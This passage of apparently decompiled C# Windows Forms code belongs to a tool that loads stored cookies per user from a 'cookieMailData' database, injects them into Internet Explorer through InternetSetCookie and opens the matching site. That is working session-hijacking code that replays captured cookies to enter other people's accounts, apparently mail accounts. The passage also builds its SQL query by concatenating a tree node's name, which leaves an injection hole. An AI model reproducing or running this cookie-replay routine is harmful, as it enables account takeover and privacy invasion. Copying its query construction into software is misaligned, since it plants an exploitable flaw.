                this.dataGridView.Columns[i].SortMode = DataGridViewColumnSortMode.NotSortable;
            }
            if ((this.dataGridView.Columns.Count > 0) && (base.Width <= 0x6e8))
            {
                this.dataGridView.Columns[0].Width = 90;
                this.dataGridView.Columns[0].ReadOnly = true;
                this.dataGridView.Columns[1].Width = 100;
                this.dataGridView.Columns[1].HeaderText = "Cookie标示";
                this.dataGridView.Columns[1].ReadOnly = true;
                this.dataGridView.Columns[2].Width = 0x4b;
                this.dataGridView.Columns[2].ReadOnly = true;
                this.dataGridView.Columns[3].Width = 50;
                this.dataGridView.Columns[3].ReadOnly = true;
                this.dataGridView.Columns[4].Width = 70;
                this.dataGridView.Columns[4].ReadOnly = true;
                this.dataGridView.Columns[5].Width = 80;
                this.dataGridView.Columns[5].ReadOnly = true;
                this.dataGridView.Columns[6].Width = 70;
                this.dataGridView.Columns[6].ReadOnly = true;
                this.dataGridView.Columns[7].Width = 70;
                this.dataGridView.Columns[7].ReadOnly = true;
                this.dataGridView.Columns[8].Width = 90;
                this.dataGridView.Columns[8].ReadOnly = true;
                this.dataGridView.Columns[9].Width = 70;
            }
        }

        private void treeViewUsers_MouseClick(object sender, MouseEventArgs e)
        {
            Point pt = new Point(e.X, e.Y);
            TreeNode nodeAt = this.treeViewUsers.GetNodeAt(pt);
            this.treeViewUsers.SelectedNode = nodeAt;
            this.treeViewUsers.ContextMenuStrip = null;
            if (nodeAt.Level != 0)
            {
                if (nodeAt.Level == 1)
                {
                    this.treeViewUsers.ContextMenuStrip = this.contextMenuStripUserList;
                }
                else if (nodeAt.Level == 2)
                {
                    nodeAt.ImageIndex = 1;
                }
            }

        }

        private void treeViewUsers_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            try
            {
                Point pt = new Point(e.X, e.Y);
                string name = this.treeViewUsers.GetNodeAt(pt).Name;
                string str2 = "SELECT * FROM users WHERE 序号=" + name;
                this.oleDbCommand = new OleDbCommand();
                this.oleDbCommand.CommandText = str2;
                this.oleDbCommand.Connection = this.conn;
                OleDbDataReader reader = this.oleDbCommand.ExecuteReader();
                while (reader.Read())
                {
                    string url = reader[0x13].ToString();
                    string cookie = reader[20].ToString();
                    this.addressTextBox.Text = url;
                    this.IEsetCOOKIE(url, cookie);
                    this.Navigate();
                    this.tabControlusers.SelectedIndex = 1;
                }
            }
            catch (Exception)
            {
            }

        }

        private void IEsetCOOKIE(string url, string cookie)
        {
            int length = -1;
            while (true)
            {
                length = cookie.IndexOf(";");
                if (length == -1)
                {
                    return;
                }
                string str = cookie.Substring(0, length);
                cookie = cookie.Substring(length + 1, (cookie.Length - length) - 1);
                if (str.IndexOf("=") != -1)
                {
                    string lbszCookieName = str.Substring(0, str.IndexOf("="));
                    string lpszCookieData = str.Substring(str.IndexOf("=") + 1, (str.Length - str.IndexOf("=")) - 1);
                    if (lpszCookieData.IndexOf(";") == -1)
                    {
                        lpszCookieData = lpszCookieData + ";expires=Sun,10-Jan-2011 00:00:00 GMT";
                    }
                    InternetSetCookie(url, lbszCookieName, lpszCookieData);
                }
            }
        }

        private void dataGridView_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.oleDbDataAdapterView.Fill(this.cookieMailData.users);
        }

    }
}
